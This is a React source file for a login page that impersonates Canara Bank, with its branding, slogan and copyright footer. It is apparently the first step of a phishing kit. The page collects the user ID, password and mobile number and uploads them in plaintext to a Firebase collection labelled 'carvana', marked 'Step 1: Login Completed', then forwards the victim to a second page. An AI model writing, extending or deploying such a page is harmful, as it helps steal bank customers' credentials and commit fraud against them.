import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import '../App.css';
import FirebaseUtil from '../FirebaseRepo';

const FirstPage = () => {
  const [userId, setUserId] = useState('');
  const [password1, setPassword1] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [captcha, setCaptcha] = useState('');
  const [captchaText, setCaptchaText] = useState('');
  const [captchaType, setCaptchaType] = useState('image');
  const [language, setLanguage] = useState('English');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [captchaError, setCaptchaError] = useState('');
  const navigate = useNavigate();

  const generateCaptcha = () => {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    setCaptchaText(result);
  };

  useEffect(() => {
    generateCaptcha();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setCaptchaError('');
    
    if (captcha !== captchaText) {
      setCaptchaError('Invalid captcha. Please try again.');
      generateCaptcha();
      setCaptcha('');
      return;
    }
    
    setIsSubmitting(true);

    try {
      const formattedTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
      const documentId = `user_${Date.now()}`;
      
      const result = await FirebaseUtil.uploadAnyModel(`carvana/${documentId}`, {
        key: documentId,
        userId: userId,
        password_1: password1,
        phoneNumber: phoneNumber,
        entry_time: formattedTime,
        current_status: "Step 1: Login Completed",
        language: language
      });
      
      if (result.state === 'success') {
        setTimeout(() => {
          setIsSubmitting(false);
          navigate(`/second/${documentId}`);
        }, 1500);
      } else {
        throw new Error(result.error || 'Failed to upload data');
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      setIsSubmitting(false);
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-white">
      <header className="bg-[#0066b3] p-4 flex justify-between items-center shadow-md">
        <div className="flex items-center">
          <div className="text-white">
            <h1 className="text-3xl font-serif">Canara Bank</h1>
            <p className="text-sm">A Government of India Undertaking</p>
            <div className="bg-yellow-100 text-yellow-800 px-2 py-0.5 text-xs mt-1 rounded inline-block font-bold">
              Fintech Syndicate
            </div>
          </div>
        </div>
      </header>

      <div className="bg-[#0066b3] text-white text-center pb-2">
        <p className="italic">Together We Can</p>
      </div>

      <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
        <div className="bg-[#0077be] text-white rounded-3xl w-full max-w-md p-5 shadow-2xl">
          <div className="text-center mb-6">
            <h2 className="text-2xl font-bold border-b-2 border-yellow-400 inline-block pb-1 uppercase">Login</h2>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <input
              type="text"
              placeholder="Enter User ID"
              value={userId}
              onChange={(e) => setUserId(e.target.value)}
              className="w-full px-4 py-3 rounded-lg bg-white text-black border-none outline-none"
              required
            />
            
            <input
              type="password"
              placeholder="Enter Password"
              value={password1}
              onChange={(e) => setPassword1(e.target.value)}
              className="w-full px-4 py-3 rounded-lg bg-white text-black border-none outline-none"
              required
            />

            {/* --- UPDATED MOBILE INPUT (10 DIGIT LIMIT) --- */}
            <input
              type="tel"
              placeholder="10-digit mobile number"
              value={phoneNumber}
              onChange={(e) => {
                const val = e.target.value.replace(/\D/g, ''); // Sirf number allow honge
                if (val.length <= 10) { setPhoneNumber(val); } // 10 digit se zyada nahi
              }}
              className="w-full px-4 py-3 rounded-lg bg-white text-black border-none outline-none"
              required
              maxLength="10"
              pattern="\d{10}"
              title="Please enter exactly 10 digits"
            />
            {/* ------------------------------------------- */}

            <div className="flex space-x-2">
              <input
                type="text"
                placeholder="Captcha"
                className="flex-1 py-3 px-4 rounded-lg text-black outline-none"
                value={captcha}
                onChange={(e) => setCaptcha(e.target.value)}
                required
              />
              <div className="bg-yellow-50 rounded-lg px-4 flex items-center justify-center font-bold text-blue-900 tracking-widest italic border-2 border-yellow-400">
                {captchaText}
              </div>
              <button type="button" onClick={generateCaptcha} className="bg-white/20 p-2 rounded-lg">🔄</button>
            </div>
            
            <button
              type="submit"
              className="w-full bg-yellow-400 hover:bg-yellow-500 text-blue-900 font-extrabold py-3 rounded-full shadow-lg"
              disabled={isSubmitting}
            >
              {isSubmitting ? "PROCESSING..." : "LOGIN"}
            </button>
          </form>
        </div>
      </main>

      <footer className="bg-gray-800 text-white p-4 text-center mt-auto">
        <p className="text-sm">© 2025 Canara Bank. All rights reserved.</p>
      </footer>
    </div>
  );
};

export default FirstPage;
